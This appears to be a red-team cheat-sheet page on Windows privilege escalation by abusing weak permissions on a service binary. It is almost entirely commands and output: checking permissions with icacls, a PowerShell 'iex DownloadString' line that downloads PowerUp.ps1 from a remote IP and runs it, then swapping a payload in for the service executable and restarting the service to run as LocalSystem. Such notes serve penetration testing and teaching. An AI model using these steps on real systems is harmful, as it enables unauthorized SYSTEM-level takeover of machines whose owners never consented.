---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/weak-service-binary-permissions
---

# Weak Service Binary Permissions

Enumerate Permission on Binary

```powershell
C:\>icacls "C:\Setup\Vuln Service\VulnService.exe"
C:\Setup\Vuln Service\VulnService.exe BUILTIN\Administrators:(I)(F)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      BUILTIN\Users:(I)(RX)
                                      NT AUTHORITY\Authenticated Users:(I)(M)
```

PowerUp

```powershell
PS C:\> iex(new-object net.webclient).DownloadString('http://192.168.19.134/PowerUp.ps1')

[*] Checking service executable and argument permissions...

[*] Running Invoke-AllChecks

ServiceName                     : VulnService
Path                            : C:\Setup\Vuln Service\VulnService.exe
ModifiableFile                  : C:\Setup\Vuln Service\VulnService.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'VulnService'
CanRestart                      : False
```

We better backup the original file before abuse, then we can replace payload

```powershell
C:\Setup\Vuln Service>rename VulnService.exe VulnService.bak
C:\Setup\Vuln Service>rename Vuln.exe VulnService.exe
```

Once the service gets restarted, your payload should execute.

```powershell
C:\>sc start vulnservice
```

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
